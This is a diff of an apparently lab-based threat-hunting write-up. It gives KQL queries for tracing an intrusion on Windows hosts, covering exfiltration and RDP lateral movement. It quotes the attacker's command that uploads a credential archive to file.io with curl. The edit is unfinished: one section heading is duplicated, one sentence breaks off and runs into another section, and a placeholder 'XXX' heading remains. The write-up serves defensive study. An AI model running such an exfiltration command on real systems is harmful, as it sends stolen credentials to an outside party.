@@ -279,29 +279,47 @@ DeviceProcessEvents
 
 ---
 
-### 14. XXX
+### 14. Exfiltration: Upload & Cloud Service
 
-Searched for script files created in temporary directories since attackers often use scripting languages to automate their attack chain and identifying the initial attack script reveals the entry point and automation method used in the compromise. The PowerShell script wupdate.ps1 was created in the user's temporary directory and used to automate the attack chain. The filename was disguised to resemble a Windows update utility, enabling execution without raising suspicion.
+Searched for evidence of data exfiltration and discovered that the attacker used curl with form-based transfer syntax (i.e., -F: Form-based file upload; multipart/form-data HTTP POST) to upload the compressed credential archive to a temporary file hosting service (i.e., file.io) using the command: curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io. File.io is a temporary file hosting service that requires no authentication, automatically deletes files after download, leaves minimal traces for forensic investigation, blends with legitimate file sharing traffic, and provides anonymous upload capability.
 
 **Query used to locate events:**
 
 ```kql
-DeviceFileEvents
-| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
-| where DeviceName == "azuki-sl"
-| where FileName endswith ".ps1" or FileName endswith ".bat"
-| where ActionType == "FileCreated"
-| where FolderPath !contains "Windows Defender" 
-| where FolderPath !contains "__PSScriptPolicyTest"
-| project TimeGenerated, DeviceName, FolderPath, FileName, InitiatingProcessFileName
-| sort by TimeGenerated desc
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
+| where DeviceName == "azuki-fileserver01"
+| where FileName == "curl.exe"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
 
 ```
-<img width="2535" height="474" alt="POE_QR18" src="https://github.com/user-attachments/assets/eded8066-aa1a-4ffe-9994-78a573bb347f" />
+<img width="1776" height="595" alt="CH_Q16" src="https://github.com/user-attachments/assets/6740b98d-1933-40ec-8173-485f0e3991f5" />
 
 ---
 
-### 15. Lateral Movement: Secondary Target & Remote Access Tool
+### 15. Persistence: Registry Value Name
+
+Searched for evidence of persistence and discovered...
+
+target systems specified in remote access commands and discovered that the attacker targeted IP address 10.1.0.188 for lateral movement. Since lateral movement targets are selected based on their access to sensitive data or network privileges, identifying these targets can reveal attacker objectives. In addition, the attacker used mstsc.exe (Microsoft Terminal Services Client - the built-in Windows Remote Desktop client) for lateral movement. This Living Off The Land technique allows malicious RDP connections to blend seamlessly with legitimate IT administrative activity.
+
+**Query used to locate events:**
+
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
+| where DeviceName == "azuki-sl"
+| where FileName in ("cmdkey.exe", "mstsc.exe")
+| project TimeGenerated, FileName, ProcessCommandLine
+| sort by TimeGenerated desc
+
+```
+<img width="2140" height="474" alt="POE_QR19" src="https://github.com/user-attachments/assets/a579c51e-e75b-478e-b81e-b29b879a0fbf" />
+
+---
+
+### 15. XXX
 
 Searched for target systems specified in remote access commands and discovered that the attacker targeted IP address 10.1.0.188 for lateral movement. Since lateral movement targets are selected based on their access to sensitive data or network privileges, identifying these targets can reveal attacker objectives. In addition, the attacker used mstsc.exe (Microsoft Terminal Services Client - the built-in Windows Remote Desktop client) for lateral movement. This Living Off The Land technique allows malicious RDP connections to blend seamlessly with legitimate IT administrative activity.
 
